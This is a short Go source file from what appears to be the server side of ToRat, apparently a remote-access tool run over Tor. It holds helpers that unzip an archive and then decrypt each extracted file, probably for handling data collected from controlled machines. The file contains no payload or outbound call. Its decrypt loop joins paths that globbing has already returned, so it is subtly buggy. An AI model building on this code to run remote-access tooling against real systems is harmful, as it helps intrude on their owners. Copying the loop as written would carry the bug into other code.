package server

import (
	"path/filepath"

	"github.com/lu4p/ToRat_server/crypto"
	"github.com/pierrre/archivefile/zip"
)

func unZip(path string, outpath string) error {
	progress := func(archivePath string) {
	}
	err := zip.UnarchiveFile(path, outpath, progress)
	if err != nil {
		return err
	}
	return nil
}

func decZip(path string, outpath string) error {
	err := unZip(path, outpath)
	if err != nil {
		return err
	}
	files, err := filepath.Glob(outpath)
	if err != nil {
		return err
	}
	for _, file := range files {
		err := crypto.DecFile(filepath.Join(outpath, file))
		if err != nil {
			return err
		}
	}
	return nil
}
